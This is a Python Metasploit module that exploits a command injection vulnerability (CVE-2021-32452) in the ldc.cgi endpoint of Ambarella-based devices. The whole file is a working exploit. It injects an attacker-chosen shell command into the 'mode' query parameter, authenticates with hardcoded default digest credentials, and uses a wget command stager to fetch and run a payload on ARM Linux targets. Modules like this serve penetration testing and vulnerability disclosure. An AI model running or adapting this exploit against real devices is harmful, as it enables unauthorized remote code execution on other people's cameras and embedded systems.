#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    import hashlib
    import argparse
    import sys
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Ambarella ldc.cgi Command Injection',
    'description': '''
        This module exploits a command injection vulnerability in the ldc.cgi executable used by various ambarella devices. 
    ''',
    'authors': ['Jared French, Somerset Recon, Inc.'],
    'date': '2021-07-21',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://somersetrecon.com/blog/'},
        {'type': 'url', 'ref': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32452'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'rank': 'excellent',
    'targets': [
        {'platform': 'linux', 'arch': 'armle'}
    ],
    'payload': {
        'command_stager_flavor': 'wget',
        },
    'options': {
        'RHOST': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'HTTPS': {'type': 'bool', 'description': 'Use https', 'required': True, 'default': False}

        }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['RHOST']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    try:

        if args['HTTPS'] is True:
            prefix = 'https://'
        else:
            prefix = 'http://'
       
        #fix issue with +x not sending/getting encoded properly by changing to 777
        cmd = args['command'].replace('+x', '777')

        r = requests.get('{}{}/cgi-bin/ldc.cgi?mode=;{};'.format(prefix, args['RHOST'], cmd))
        nonce = r.headers['WWW-Authenticate'][50:82]
    
        cnonce = '1234567'
        nc = '00000001'
        qop = 'auth'
        auth = 'admin:ycam.com:admin'
        request_uri = 'GET:/'
        ha1 = hashlib.md5(auth.encode()).hexdigest()
        ha2 = hashlib.md5(request_uri.encode()).hexdigest()
        final = ha1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + ha2
        response_val = hashlib.md5(final.encode()).hexdigest()

        r = requests.get('{}{}/cgi-bin/ldc.cgi?mode=;{};'.format(prefix, args['RHOST'], cmd), headers={'Authorization':'Digest username="admin", realm="ycam.com", nonce="'+nonce+'", uri="/", response="'+response_val+'", qop=auth, nc=00000001, cnonce="'+cnonce+'"'})

    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        return

if __name__ == '__main__':
    module.run(metadata, run)
